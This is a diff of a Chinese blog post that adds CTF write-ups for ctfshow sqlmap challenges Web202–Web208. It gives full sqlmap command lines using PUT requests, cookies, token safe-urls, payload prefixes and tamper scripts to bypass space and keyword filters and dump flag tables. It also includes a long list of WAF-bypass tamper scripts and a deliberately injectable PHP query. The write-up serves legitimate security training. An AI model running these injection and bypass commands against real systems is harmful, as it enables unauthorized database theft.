@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web201"><span class="toc-text">web201</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web201"><span class="toc-text">web201</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web202"><span class="toc-text">Web202</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web203"><span class="toc-text">Web203</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web204"><span class="toc-text">Web204</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web205"><span class="toc-text">Web205</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web206"><span class="toc-text">Web206</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%952%EF%BC%9A%E8%AE%BE%E7%BD%AElevel"><span class="toc-text">法2：设置level</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web207-tamper"><span class="toc-text">Web207(tamper)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web208"><span class="toc-text">Web208</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -231,7 +231,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/ctfshow/" style="color: #00a596">ctfshow</a>
+                <a href="/blog/tags/ctfshow/" style="color: #ffa2c4">ctfshow</a>
             </span>
             
         </span>
@@ -245,7 +245,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">351字</span>
+        <span class="post-count">1.7k字</span>
       </span>
     </span>
 
@@ -254,7 +254,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">7分</span>
       </span>
     </span>
     
@@ -311,6 +311,162 @@
 
 <p><img src="/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230728234811151.png" alt="image-20230728234811151"></p>
 <p>获得flag</p>
+<hr>
+<h1 id="Web202"><a href="#Web202" class="headerlink" title="Web202"></a>Web202</h1><blockquote>
+<p>使用–data 调整sqlmap的请求方式</p>
+</blockquote>
+<p><code>--data</code>：通过POST发送数据字符串，例如: –data&#x3D;”id&#x3D;1”</p>
+<p>我们先在本地用POST请求尝试一下，记得带上ua头</p>
+<p><img src="/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230729094152427.png" alt="image-20230729094152427"></p>
+<p>返回成功</p>
+<p>sqlmap开梭</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://365f28a3-7450-4ba5-ad0b-a377fd41ea1a.challenge.ctf.show/api/"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230729094450842.png" alt="image-20230729094450842"></p>
+<p>成功</p>
+<p>接下来就是和上题一样的步骤获取flag</p>
+<p><img src="/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230729094708726.png" alt="image-20230729094708726"></p>
+<hr>
+<h1 id="Web203"><a href="#Web203" class="headerlink" title="Web203"></a>Web203</h1><blockquote>
+<p>使用–method 调整sqlmap的请求方式</p>
+</blockquote>
+<p><code>--method</code>：强制使用指定的方式进行连接，例如 PUT</p>
+<p>稍微测试一下发现这题要求使用PUT请求方式</p>
+<p>sqlmap开梭，url要指明index.php，还要加上<code>--headers</code>&#x3D;“Content-Type: text&#x2F;plain” 便于 put 接收表单参数</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://ec7883db-7df1-4e02-87f6-2f6aa199cc7a.challenge.ctf.show/api/index.php"</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="Web204"><a href="#Web204" class="headerlink" title="Web204"></a>Web204</h1><blockquote>
+<p>使用–cookie 提交cookie数据</p>
+</blockquote>
+<p><code>--cookie</code>：设置HTTP Cookie 头的值</p>
+<p>上一题的升级版</p>
+<p>cookie取set-cookie的值</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://81dbb7e1-ef42-4423-a3b3-8a9843de5753.challenge.ctf.show/api/index.php"</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"ctfshow=d6b38945636ae3b2814903cf50a3eb97;PHPSESSID=mgu0map35ai84u25s5ei13hb7b"</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_user <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="Web205"><a href="#Web205" class="headerlink" title="Web205"></a>Web205</h1><blockquote>
+<p>api调用需要鉴权，访问特定页面</p>
+</blockquote>
+<p><code>--safe-url</code>：设置在测试目标地址前访问的安全链接</p>
+<p><code>--safe-freq</code>：设置两次注入测试前访问安全链接的次数</p>
+<p>进入题目，输入id并查询，抓一下这个包看看</p>
+<p><img src="/blog/2023/07/28/ctfshow-sqlmap%E5%AE%9E%E6%88%98%E8%AE%BA/image-20230729164902806.png" alt="image-20230729164902806"></p>
+<p>发现除了查询接口外还调用了一个getToken.php来鉴权</p>
+<p>升级一下上题的shell，顺便发现flag换了个表</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://ebaf5ce4-0624-4921-91fd-2adedf09cb59.challenge.ctf.show/api/index.php"</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"ctfshow=d6b38945636ae3b2814903cf50a3eb97;PHPSESSID=mgu0map35ai84u25s5ei13hb7b"</span> --safe-url<span class="token operator">=</span><span class="token string">"http://ebaf5ce4-0624-4921-91fd-2adedf09cb59.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flax <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="Web206"><a href="#Web206" class="headerlink" title="Web206"></a>Web206</h1><blockquote>
+<p>非常规sql语句需要自行闭合</p>
+</blockquote>
+<p>题目sql查询语句修改为</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"') limit 0,1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>所以我们得指定payload的前后缀使其语句闭合</p>
+<p><code>--prefix</code>：攻击载荷的前缀</p>
+<p><code>--suffix</code>：攻击载荷的后缀</p>
+<p>修改下上题的shell，添加一个payload前缀<code>&#39;)&#39;</code>使前面的语句闭合</p>
+<p>然后查表找到flag所在的表dump出来即可</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://33bf3978-d990-4ec8-b089-e0ec439834aa.challenge.ctf.show/api/index.php"</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"ctfshow=d6b38945636ae3b2814903cf50a3eb97;PHPSESSID=mgu0map35ai84u25s5ei13hb7b"</span> --safe-url<span class="token operator">=</span><span class="token string">"http://33bf3978-d990-4ec8-b089-e0ec439834aa.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--prefix</span><span class="token operator">=</span><span class="token string">"')"</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxc <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="法2：设置level"><a href="#法2：设置level" class="headerlink" title="法2：设置level"></a>法2：设置level</h2><p><code>--level=LEVEL</code> 指定注入测试级别 例如：1-5, 默认 1</p>
+<p>level调高一点就能注出来了</p>
+<hr>
+<h1 id="Web207-tamper"><a href="#Web207-tamper" class="headerlink" title="Web207(tamper)"></a>Web207(tamper)</h1><blockquote>
+<p>–tamper 的初体验：过滤空格</p>
+</blockquote>
+<p><code>--tamper</code>：指定攻击载荷的篡改脚本</p>
+<p>题目过滤了空格，可以用<code>tamper</code>来修改注入的数据</p>
+<p>常见的tamper脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">space2comment.py 用&#x2F;**&#x2F;代替空格
+
+apostrophemask.py 用utf8代替引号
+
+equaltolike.py like代替等号
+
+space2dash.py　绕过过滤‘&#x3D;’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）
+
+greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。
+
+space2hash.py 空格替换为#号,随机字符串以及换行符
+
+apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。
+
+halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
+
+space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符
+
+appendnullbyte.py 在有效负荷结束位置加载零字节字符编码
+
+ifnull2ifisnull.py 绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’
+
+space2mssqlblank.py (mssql)空格替换为其它空符号
+
+base64encode.py　用base64编码替换
+
+space2mssqlhash.py　替换空格
+
+modsecurityversioned.py 过滤空格，包含完整的查询版本注释
+
+space2mysqlblank.py　空格替换其它空白符号(mysql)
+
+between.py用between 替换大于号（&gt;）
+
+space2mysqldash.py 替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
+
+multiplespaces.py 围绕SQL关键字添加多个空格
+
+space2plus.py 用+替换空格
+
+bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换&#x3D;为like
+
+nonrecursivereplacement.py 双重查询语句,取代SQL关键字
+
+space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集
+
+sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾
+
+chardoubleencode.py 双url编码(不处理以编码的)
+
+unionalltounion.py 替换UNION ALLSELECT UNION SELECT
+
+charencode.py　url编码
+
+randomcase.py 随机大小写
+
+unmagicquotes.py 宽字符绕过 GPCaddslashes
+
+randomcomments.py 用&#x2F;**&#x2F;分割sql关键字
+
+charunicodeencode.py 字符串 unicode 编码
+
+securesphere.py 追加特制的字符串
+
+versionedmorekeywords.py 注释绕过
+
+space2comment.py 替换空格字符串(‘‘) 使用注释‘&#x2F;**&#x2F;’
+
+halfversionedmorekeywords.py 关键字前加注释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>升级一下shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://95ebcad6-857d-43ad-8812-09f6c9b48cc5.challenge.ctf.show/api/index.php"</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"ctfshow=d6b38945636ae3b2814903cf50a3eb97;PHPSESSID=mgu0map35ai84u25s5ei13hb7b"</span> --safe-url<span class="token operator">=</span><span class="token string">"http://95ebcad6-857d-43ad-8812-09f6c9b48cc5.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--prefix</span><span class="token operator">=</span><span class="token string">"')"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>space2comment <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxcac <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="Web208"><a href="#Web208" class="headerlink" title="Web208"></a>Web208</h1><blockquote>
+<p>关键词匹配过滤</p>
+</blockquote>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span>
+<span class="token comment">// $id = str_replace('select', '', $id);</span>
+  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>过滤了<code>select</code>和空格</p>
+<p>那可以用大小写绕过randomcase.py，或者双写绕过doubleSelect.py</p>
+<p>升级一下shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://77eec3bc-6524-4f36-a6a0-a243ff18a3d0.challenge.ctf.show/api/index.php"</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id="</span> --user-agent<span class="token operator">=</span>sqlmap <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"ctfshow=d6b38945636ae3b2814903cf50a3eb97;PHPSESSID=mgu0map35ai84u25s5ei13hb7b"</span> --safe-url<span class="token operator">=</span><span class="token string">"http://77eec3bc-6524-4f36-a6a0-a243ff18a3d0.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--prefix</span><span class="token operator">=</span><span class="token string">"')"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"space2comment,randomcase"</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">-T</span> ctfshow_flaxcac <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <hr>
 
     </div>
